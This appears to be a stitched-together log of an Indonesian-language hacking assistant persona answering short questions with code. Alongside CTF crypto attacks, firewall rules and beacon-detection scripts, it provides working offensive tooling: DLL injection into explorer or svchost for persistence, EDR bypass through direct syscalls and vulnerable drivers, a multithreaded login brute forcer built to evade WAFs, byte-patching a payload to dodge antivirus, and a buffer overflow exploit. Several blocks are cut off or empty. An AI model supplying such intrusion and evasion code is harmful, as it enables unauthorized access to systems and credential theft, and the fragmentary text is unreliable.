# Hastad's Broadcast Attack (e=3, same message ke multiple recipients)
from sympy.ntheory.modular import crt
from sympy import integer_nthroot

# Kalau e=3 dan pesan sama ke-encrypt ke 3 public keys
n1, c1 = PUBLIC_KEY_1
n2, c2 = PUBLIC_KEY_2  
n3, c3 = PUBLIC_KEY_3

m3, _ = crt([n1, n2, n3], [c1, c2, c3])
```

```python
#!/usr/bin/env python3
# Brute force AES-CBC dengan weak/short key
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import itertools, string

CIPHERTEXT = bytes.fromhex('YOUR_CIPHERTEXT_HEX')
IV = bytes.fromhex('YOUR_IV_HEX')

# Brute 4-digit PIN key
for pin in range(10000):
    key = str(pin).zfill(4).encode().ljust(16, b'\x00')
    try:
        cipher = AES.new(key, AES.MODE_CBC, IV)
        plain = unpad(cipher.decrypt(CIPHERTEXT), 16)
        if all(32 <= b < 127 for b in plain):  # printable
            print(f'Key: {pin} → {plain.decode()}')
    except: pass
```

```python
from sympy import factorint
from Crypto.Util.number import inverse, long_to_bytes

# Given: n, e, ciphertext
n = BIGNUM
e = 65537
c = CIPHERTEXT

# Factor n (works kalau n kecil atau smooth)
print('Factoring...')
factors = factorint(n)
print(f'Factors: {factors}')
p, q = list(factors.keys())

# Calculate private key
phi = (p-1) * (q-1)
d = inverse(e, phi)

# Decrypt
m = pow(c, d, n)
flag = long_to_bytes(m)
print(f'Plaintext: {flag}')
```

cara setup firewall rules yang proper di Linux?

```bash
# UFW (Ubuntu) - simple
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw deny from 192.168.1.0/24 to any port 3306  # Block MySQL from network
sudo ufw enable
sudo ufw status verbose

# iptables - granular
# Flush existing
sudo iptables -F
sudo iptables -X

# Default policies
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Allow established connections
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT  # loopback
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH

# Block known malicious IPs
sudo iptables -A INPUT -s 192.168.1.50 -j DROP

# Rate limit SSH
sudo iptables -A INPUT -p tcp --dport 22 -m recent --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Save rules
sudo iptables-save > /etc/iptables/rules.v4
```

cara process injection ke dalam proses legitimate Windows?

```python
# Process Hollowing (pake pwntools style)
import ctypes, struct
from ctypes import wintypes

# Atau via meterpreter yang lebih praktis:
# migrate ke explorer.exe atau svchost.exe

# Di meterpreter session:
# ps  # lihat semua proses
# migrate 1234  # migrate ke PID explorer.exe

# Classic DLL injection via Python
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def inject_dll(pid, dll_path):
    dll_path_b = dll_path.encode() + b'\x00'
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_path_b), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    kernel32.WriteProcessMemory(hProcess, addr, dll_path_b, len(dll_path_b), None)
    hThread = kernel32.CreateRemoteThread(hProcess, None, 0, kernel32.GetProcAddress(kernel32.GetModuleHandleA(b'kernel32'), b'LoadLibraryA'), addr, 0, None)
    return hThread

# inject_dll(explorer_pid, r'C:\path\to\shell.dll')
```
Migrate ke proses yang usia panjang (svchost, explorer) supaya persistence lebih stabil bro.

cara bypass EDR (Endpoint Detection Response) yang advanced?

```python
# EDR bypass techniques:

# 1. Direct syscalls (bypass userland hooks)
# EDR hook NtCreateProcess, NtOpenProcess dll di ntdll.dll
# Solution: call syscalls directly tanpa via ntdll

# SysWhispers2 - generate direct syscall stubs
# python3 SysWhispers.py --function-list NtCreateProcess,NtOpenProcess -o syscalls

# 2. Heaven's Gate (x86 to x64 transition)
# Bypass 32-bit hooks

# 3. Kernel-level operations via driver
# Load vulnerable driver (BYOVD)

# 4. Process tampering detection
from ctypes import windll
import ctypes
# Check jika ada hooks di ntdll
ntdll = ctypes.WinDLL('ntdll.dll')
addr = ctypes.cast(ntdll.NtCreateFile, ctypes.c_void_p).value
# Cek byte pertama - kalau ada 'jmp' instruction = hooked by EDR
first_bytes = (ctypes.c_ubyte * 5).from_address(addr)
if first_bytes[0] == 0xE9 or first_bytes[0] == 0xFF:
    print('NtCreateFile is HOOKED!')

# 5. Indirect syscalls
# Use ntdll gadgets untuk panggil syscall tanpa trace ke malicious code
```
EDR modern sangat sophisticated bro. Defense-in-depth: direct syscalls + encryption + process injection combo.

```bash
with open('/dev/sda1','rb') as f:
    data = f.read()
for sig,ext in [(b'\xff\xd8\xff','jpg'),(b'%PDF','pdf')]:
    pos = 0
    while True:
        pos = data.find(sig, pos)
        if pos == -1: break
        open(f'carved_{pos}.{ext}','wb').write(data[pos:pos+65536])
```

cara analisis ransomware untuk cari encryption weakness?

```python
# Static analysis dulu
import pefile
pe = pefile.PE('ransomware.exe')

# Cari crypto API calls
crypto_apis = ['CryptGenKey', 'CryptEncrypt', 'BCryptEncrypt', 'CryptGenRandom',
               'AES', 'RSA', 'ChaCha', 'Salsa']

for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        if imp.name and any(c in str(imp.name) for c in crypto_apis):
            print(f'Crypto API: {imp.name}')

# Cari key generation patterns
import re
with open('ransomware.exe', 'rb') as f:
    data = f.read()

# Hardcoded key?
for m in re.finditer(rb'[\x00-\xff]{16,32}', data):
    chunk = m.group()
    # Check entropy of chunk
    from collections import Counter
    import math
    counts = Counter(chunk)
    entropy = -sum(c/len(chunk)*math.log2(c/len(chunk)) for c in counts.values())
    if entropy > 7.5:  # high entropy = possible key
        print(f'Possible key at 0x{m.start():x}: {chunk.hex()}')

# Check online decryptors
# https://www.nomoreransom.org
# https://id-ransomware.malwarehunterteam.com
```

cara detect C2 beacon pattern dari network traffic?

```python
#!/usr/bin/env python3
# Detect beaconing pattern dari network logs
from scapy.all import rdpcap
from collections import defaultdict
import statistics

packets = rdpcap('traffic.pcap')

# Group by destination IP
connections = defaultdict(list)
for pkt in packets:
    if pkt.haslayer('IP') and pkt.haslayer('TCP'):
        dst = pkt['IP'].dst
        connections[dst].append(float(pkt.time))

# Analyze timing regularity
for ip, timestamps in connections.items():
    if len(timestamps) < 5:
        continue
    intervals = [timestamps[i+1]-timestamps[i] for i in range(len(timestamps)-1)]
    if not intervals:
        continue
    mean = statistics.mean(intervals)
    stdev = statistics.stdev(intervals) if len(intervals) > 1 else 0
    jitter = (stdev/mean * 100) if mean > 0 else 0
    if jitter < 15 and 10 < mean < 3600:  # regular interval, low jitter
        print(f'BEACON DETECTED: {ip}')
        print(f'  Interval: {mean:.1f}s, Jitter: {jitter:.1f}%, Count: {len(timestamps)}')
```
C2 beacon = regular intervals dengan low jitter. Cobalt Strike default = 60s. Metasploit = 5s bro.

/forge buat HTTP login brute forcer dengan detection bypass

```python
#!/usr/bin/env python3
"""NEXUS HTTP Brute Forcer with WAF Bypass"""
import requests
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
]

def try_login(url, user_field, pass_field, user, password, fail_string, delay=0.5):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    data = {user_field: user, pass_field: password}
    try:
        r = requests.post(url, data=data, headers=headers,
                          allow_redirects=True, timeout=10)
        if fail_string not in r.text and r.status_code not in [401, 403]:
            return True, password
    except:
        pass
    time.sleep(delay + random.uniform(0, 0.3))
    return False, None

def brute(url, user_field, pass_field, username, wordlist, fail_string, threads=5, delay=0.5):
    print(f'[*] Bruteforce: {url} | user={username}')
    with open(wordlist) as f:
        passwords = [l.strip() for l in f if l.strip()]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(try_login, url, user_field, pass_field,
                             username, p, fail_string, delay): p for p in passwords}
        from concurrent.futures import as_completed
        for fut in as_completed(futures):
            ok, pwd = fut.result()
            if ok:
                print(f'[+] FOUND: {username}:{pwd}')
                return pwd
    print('[-] Not found')
    return None

if __name__ == '__main__':
    brute(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
# Usage: python3 script.py URL user_field pass_field username wordlist fail_text
```

```
[recon-ng][targetcorp] > run
[recon-ng][targetcorp] > modules load recon/domains-contacts/whois_pocs
[recon-ng][targetcorp] > run
[recon-ng][targetcorp] > reporting load reporting/html

[recon-ng][targetcorp] > run
```

Basic CTF workflow:
```python
from pwn import *

binary = './vuln_binary'
elf = ELF(binary)
context.binary = elf

# Local
p = process(binary)
# Remote
# p = remote('chall.ctf.com', 1337)

# Find offset
p.sendline(cyclic(200))
p.wait()
# Cek core dump untuk offset
offset = cyclic_find(0x61616166)  # dari GDB

# Build payload
p = process(binary)
payload = flat(b'A' * offset, p64(elf.sym['win']))
p.sendline(payload)
p.interactive()
```

Send binary-nya bro kalau mau gw bantu analyze lebih detail.

Output kasih byte range yang trigger detection.

Patch bytes tersebut:
```python
with open('payload.exe', 'rb') as f:
    data = bytearray(f.read())

# XOR bytes yang flagged (misal 0x1234 - 0x5678)
for i in range(0x1234, 0x5679):
    data[i] ^= 0x41

with open('payload_patched.exe', 'wb') as f:
    f.write(data)
```

```bash
"
```

Step by step bro:

```bash

  _firmware.bin.extracted/ \
  --include='*.conf' --include='*.cfg' --include='*.sh' -l

# Cari private keys
find _firmware.bin.extracted/ -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null

# Cari shadow/passwd files
find _firmware.bin.extracted/ -name 'shadow' -o -name 'passwd' 2>/dev/null | xargs cat 2>/dev/null

# Step 4: Comprehensive dengan EMBA
```
